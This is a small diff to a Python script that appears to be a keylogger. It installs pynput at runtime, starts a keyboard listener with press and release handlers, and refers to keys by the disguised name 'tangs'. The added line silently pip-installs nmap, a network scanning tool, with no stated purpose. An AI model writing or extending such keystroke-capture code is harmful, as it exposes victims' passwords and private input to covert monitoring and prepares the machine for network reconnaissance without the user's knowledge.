@@ -63,6 +63,7 @@ def write_file(tangs):
 
 # Check if the `pynput` package is installed
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'nmap'])
 
 # Start the tang listener
 with Listener(on_press=on_press, on_release=on_release) as listener:
